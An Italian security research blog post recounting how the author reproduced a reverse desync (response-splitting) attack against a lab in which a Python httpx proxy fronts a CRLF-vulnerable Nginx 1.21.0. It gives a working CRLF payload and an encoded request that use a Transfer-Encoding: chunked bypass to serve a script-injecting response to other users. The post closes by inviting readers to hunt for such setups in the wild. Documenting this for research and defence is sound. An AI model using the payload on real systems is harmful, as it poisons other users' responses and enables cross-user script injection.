---
title: "Reverse Desync + TE.Chunked Bypass in architetture httpx+nginx"
date: 2026-08-14
tags: ["HTTP Smuggling", "Reverse Desync", "CRLF Injection", "Nginx", "httpx", "Response Splitting"]
description: "Dalla ricerca di PortSwigger a un PoC funzionante: come abbiamo dimostrato che i Reverse Desync sono possibili oggi sfruttando httpx e un bypass con Transfer-Encoding chunked."
---

## TL;DR

Dopo aver letto la ricerca di [Tom Stacey (@t0xodile) e Tobia Righi (@m4st3rspl1nt3r)](https://portswigger.net/research/crlf-powered-desync-attacks) sui *CRLF-Powered Desync Attacks*, Ho voluto approfondire un aspetto specifico: i **Reverse Desync** (Response Splitting). 

Volevo scoprire se fossero ancora possibili, anche se solo in un ambiente di lab, quale stack tecnologico lo permettesse e se questa configurazione fosse plausibile in the wild. Ho testato empiricamente come diversi client HTTP gestiscono le stacked responses e ho scoperto che **`httpx`** (il client HTTP più usato in Python) segue l'RFC alla lettera, non implementando quindi la mitigazione "over-read" che protegge browser, `curl` e altre librerie. 

Ho  quindi costruito un lab plausibile (un reverse proxy Python con `httpx` che parla con un Nginx 1.21.0 vulnerabile) e sviluppato un bypass basato su `Transfer-Encoding: chunked` per neutralizzare il body HTML di default di Nginx. Il risultato? Un XSS cross-user confermato.

---

## 1. Il contesto: CRLF-Powered Desync e Reverse Desync

La ricerca di PortSwigger ha dimostrato che la CRLF injection lato richiesta (Request Splitting) può escalare in un Desync Worm. Ma il paper menziona anche i *Reverse Desync Attacks*, una tecnica vecchia del 2004 (Amit Klein) che era stata data per morta a causa dello "Stacked Response Problem".

### Cos'è un Reverse Desync?
In un attacco Desync classico (Forward), l'attaccante avvelena la **richiesta** per far desincronizzare la coda delle richieste. In un Reverse Desync, l'attaccante avvelena la **risposta** (Response Splitting): costringe il back-end a inviare due risposte HTTP su una singola connessione keep-alive. 

La prima risposta va all'attaccante. La **seconda risposta** (iniettata) resta nel buffer TCP. Quando la prossima vittima fa una richiesta, il proxy gli serve la risposta avvelenata.

### Perché era "morto"? Lo Stacked Response Problem
I browser moderni e `curl` implementano l'**over-read protection**: dopo aver letto il body di una risposta (basandosi su `Content-Length`), leggono qualche byte in più. Se trovano dati extra (la seconda risposta iniettata), chiudono la connessione e scartano il veleno.

## 2. La ricerca: Quali client sono vulnerabili?

Volendo verificare se oggi esistessero client HTTP ampiamente utilizzati che **non** implementano questa protezione, ho scritto uno script Python che funge da mini-server e invia deliberatamente risposte impilate, testando diverse varianti di framing:

1. `cl0` (`Content-Length: 0` + 2a risposta)
2. `chunked_empty` (`TE: chunked`, body vuoto, `0\r\n\r\n` + 2a risposta)
3. `chunked_body` (`TE: chunked`, body "hello" + 2a risposta)

I risultati sono stati i seguenti:

| Client | CL:0 | Chunked | Hardening |
|---|---|---|---|
| **curl** | ✅ SAFE (Excess found) | ✅ SAFE (new conn) | Completo |
| **httpx** | ⚠️ VULN | ⚠️ VULN | **Nessuno** |
| **Node.js** | Inc | Inc | Parziale |
| **urllib** | N/A | N/A | Non riusa connessioni |

**`httpx`** accetta la seconda risposta iniettata e la serve alla prossima richiesta senza protestare. Segue l'RFC alla lettera (legge esattamente i byte dichiarati), ma è insicuro in questo scenario.

## 3. Il Lab: Uno stack plausibile

Se `httpx` è il "weak link", dove si trova in the wild? Non è un server standalone, è una libreria client. Si trova nei **reverse proxy custom scritti in Python** (FastAPI/Starlette/ASGI) che fungono da Backend-For-Frontend (BFF) o API Gateway.

Abbiamo costruito un lab Docker con questa architettura:

```
Attaccante/Vittima → BFF (Python + httpx) → Backend (Nginx 1.21.0)
```

- **Backend**: Vero Nginx 1.21.0 (l'ultima versione prima che sanificassero i CRLF negli header di risposta). Ha la misconfigurazione descritta nel paper: `return 302 https://$host$uri;`. Questo fa sì che `$uri` venga URL-decodificato e i `%0d%0a` diventino `\r\n` reali nell'header `Location` della risposta.
- **BFF**: Un'app ASGI in Python che usa `httpx.AsyncClient` per forwardare le richieste al backend, con un pool di connessioni keep-alive.

Questa catena è plausibile: microservizi Python che proxano verso Nginx sono ovunque.

## 4. L'ostacolo: Il body HTML di Nginx

Il primo test del lab ha fallito. Perché? Quando Nginx fa `return 302`, genera automaticamente un body HTML di default (`<html><head><title>302 Found</title>...`) e imposta `Content-Length: 145`.

Iniettando il payload per chiudere la prima risposta e iniziare la seconda, vengono creati **due `Content-Length`** in conflitto nella stessa risposta. `httpx` usava il primo (145) e inglobava la seconda risposta come "body spazzatura", fallendo l'attacco.

## 5. Il Bypass: TE.Chunked

Per risolvere, è stata usata una tecnica menzionata nella ricerca originale: l'iniezione di `Transfer-Encoding: chunked`.

Per l'RFC 7230, se un messaggio ha sia `Content-Length` che `Transfer-Encoding: chunked`, il `Content-Length` **deve essere ignorato**. 

Quindi è stato modificato il payload iniettato nel `Location` per:
1. Aggiungere `Transfer-Encoding: chunked` (così `httpx` ignora il `CL: 145` di Nginx).
2. Chiudere gli header con `\r\n\r\n`.
3. Inviare `0\r\n\r\n` (chunk terminatore). Questo dice a `httpx` che il body chunked è vuoto e la prima risposta è finita.
4. Iniettare la **seconda risposta** con l'XSS.

A quel punto, i 145 byte di body HTML di Nginx arrivano dopo e finiscono nel buffer, ma `httpx` ha già considerato conclusa la prima risposta e ha servito la seconda (XSS) alla vittima.

### Il Payload

Costruzione del payload:

```python
xss = '<script>alert("XSS via Reverse Desync + TE.Chunked Bypass")</script>'

    payload = (
        "\r\n"                        # Closes the Location header
        "Transfer-Encoding: chunked\r\n" # Ignores Nginx's Content-Length
        "\r\n"                        # End of first response headers
        "0\r\n"                       # Chunk size 0 (terminates the chunked body)
        "\r\n"                        # End of chunk
        "HTTP/1.1 200 OK\r\n"         # Start of second response (XSS)
        "Content-Type: text/html\r\n"
        f"Content-Length: {len(xss)}\r\n"
        "Connection: keep-alive\r\n"
        "\r\n"
        f"{xss}"
    )
```

L'attaccante invia questa richiesta al BFF:
```http
GET /%0D%0ATransfer-Encoding%3A%20chunked%0D%0A%0D%0A0%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0AContent-Length%3A%2050%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0A%3Cscript%3Ealert%28%22Reverse%20Desync%20%2B%20TE.Chunked%20Bypass%22%29%3C%2Fscript%3E HTTP/1.1
Host: target
```

Nginx decodifica il path e costruisce la risposta avvelenata. `httpx` la forwarda. La vittima naviga su `/api/profile` e riceve l'alert JavaScript invece del JSON legittimo.

![image1](/images/desync/desyncalert.png)

## 6. Conclusione

I Reverse Desync non sono morti. Vivono nei "weak link" della catena HTTP: librerie client RFC-compliant ma prive di mitigazioni anti-smuggling, come `httpx`. 

Se un'architettura usa un proxy Python davanti a un Nginx vulnerabile (o qualsiasi back-end con CRLF injection lato risposta), un attaccante può bypassare lo stacked response problem usando `Transfer-Encoding: chunked` e avvelenare le risposte degli utenti.

## 7. Il tesoro di Gol %0D%0A Roger 

![image2](/images/desync/goldroger.png)

Probabilmente il web è così vasto che qualche configurazione vulnerabile a reverse desync simile a questa esiste in the wild... buona ricerca!

---

### Riferimenti e Lab
- **Ricerca originale**: [CRLF-Powered Desync Attacks (PortSwigger)](https://portswigger.net/research/crlf-powered-desync-attacks)
- **Autori**: Tom Stacey (@t0xodile), Tobia Righi (@m4st3rspl1nt3r)
- **Lab Docker**: Disponibile su GitHub (https://github.com/xb8/ReverseDesyncLab)
